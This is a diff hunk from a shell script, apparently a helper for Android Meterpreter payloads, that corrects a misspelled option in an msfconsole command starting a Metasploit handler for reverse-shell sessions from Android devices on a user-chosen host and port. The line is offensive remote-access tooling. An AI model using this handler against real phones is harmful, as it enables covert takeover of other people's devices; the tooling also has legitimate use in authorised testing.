@@ -56,7 +56,7 @@ read lisn
 
 	read lportt
 
-	   msfconsole -q -x "use exploit/multi/handler;set payload android/meterpreter/reverse_$type; set LHOST $lhostt; set LPORT $lportt; set ReverseListenerBindAdress localhost; exploit"
+	   msfconsole -q -x "use exploit/multi/handler;set payload android/meterpreter/reverse_$type; set LHOST $lhostt; set LPORT $lportt; set ReverseListenerBindAddress localhost; exploit"
 	   ;;
 	  [nN]) echo ${RED}"bubye"
 	   exit 0
